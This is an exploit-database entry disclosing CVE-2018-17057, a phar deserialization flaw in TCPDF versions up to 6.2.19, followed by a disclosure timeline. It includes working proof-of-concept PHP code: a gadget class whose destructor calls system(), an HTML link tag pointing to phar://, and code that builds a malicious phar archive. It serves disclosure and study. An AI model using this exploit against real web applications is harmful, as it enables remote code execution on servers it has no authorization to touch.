@@ -1,0 +1,129 @@
+id: 32415
+date: 03/25/2019
+title: TCPDF 6.2.19 Deserialization / Remote Code Execution Exploit
+author: polict
+cves: CVE-2018-17057
+
+CVE-2018-17057: phar deserialization in TCPDF might lead to RCE
+---------------------------------------------------------------
+
+Affected products
+=================
+
+TCPDF <= 6.2.19
+
+Background
+==========
+
+"Started in 2002, TCPDF is now one of the world's most active Open Source
+projects, used daily by millions of users and included in thousands of CMS
+and Web applications." - https://tcpdf.org/
+
+"PHP library for generating PDF documents on-the-fly." -
+https://github.com/tecnickcom/TCPDF
+
+Description
+===========
+
+TCPDF allows the developers to insert HTML code inside the PDF, which will
+be translated to a similar-looking design during PDF creation. For example
+it is possible to insert basic HTML tags, such as "img" or "b" and have the
+image and bold text placed in the output PDF.
+The library allows also to include custom CSS rules by defining a "link"
+tag, like the following:
+<link type="text/css" href="style.css">
+
+While it is a nice feature to have for the developer, it may cause problems
+in case the PDF creation script is vulnerable to Cross-Site Scripting (or
+"Code Injection") issues through which an attacker can inject arbitrary
+HTML code. For example during an invoice creation, an attacker can use its
+information written on the invoice to insert a malicious "link" tag
+pointing to a local phar archive and trigger a PHP Object Injection through
+the phar:// scheme once the web application reads that file.
+
+Exploit
+=======
+
+In order to test this vulnerability it's enough to clone the project from
+github and checkout a vulnerable version, such as 6.2.19:
+git clone https://github.com/tecnickcom/TCPDF.git && cd TCPDF && git
+checkout tags/6.2.19
+
+After that it is possible to craft a phar archive containing a malicious
+PHP Object and potentially trigger a RCE, here is a vulnerable code which
+helps to reproduce the issue:
+<?php
+/*
+*    title:     PHP object injection via phar:// deserialization
+*    author:    polict
+*    target:    TCPDF (https://github.com/tecnickcom/TCPDF) <= 6.2.19
+*    setup:     git clone https://github.com/tecnickcom/TCPDF.git && cd
+TCPDF && git checkout tags/6.2.19
+*/
+
+/* include vulnerable class (any PHP Object Injection gadget can be used,
+see https://github.com/ambionics/phpggc) */
+class Vulnerable {
+    function __destruct() { system($this->hook); }
+}
+
+/* include the main TCPDF library */
+require_once('tcpdf.php');
+/* create new PDF document */
+$pdf = new TCPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true,
+'UTF-8', false);
+/* set document information */
+$pdf->SetAuthor('polict');
+$pdf->SetTitle('Proof of concept');
+/* start pdf */
+$pdf->AddPage();
+/* create some HTML content */
+$html = '<link type="text/css" href="phar://./poc.phar">';
+/* insert the HTML content -- exploit will trigger here */
+$pdf->writeHTML($html, true, false, true, false, '');
+/* close and output PDF document */
+$pdf->Output('poc.pdf', 'I');
+
+In order to create the evil archive it's possible to use PHP:
+<?php
+$phar = new Phar('poc.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub('<?php __HALT_COMPILER(); ? >');
+
+$malicious_object = new Vulnerable();
+$malicious_object->hook = "whoami";
+$phar->setMetadata($malicious_object); // <-- inject the trigger
+
+$phar->stopBuffering();
+
+The archive will be in 'poc.phar'.
+
+Note: This vulnerability depends on the developer using writeHTML() with
+user-supplied input.
+
+Author
+======
+
+This issue was discovered by polict (https://polict.net).
+
+Timeline
+========
+
+17 august 2018:
+—> report to developer
+
+14 september 2018:
+—> ping
+<— released 6.2.20 (which re-introduced the vulnerability reported by Sam
+Thomas, see
+https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf
+)
+—> ping about re-introduction of old vulnerability
+<— released 6.2.22 with fix for both
+MITRE assigned CVE-2018-17057
+
+17 march 2019:
+public release
+
+#  0day.today [2023-03-23]  #
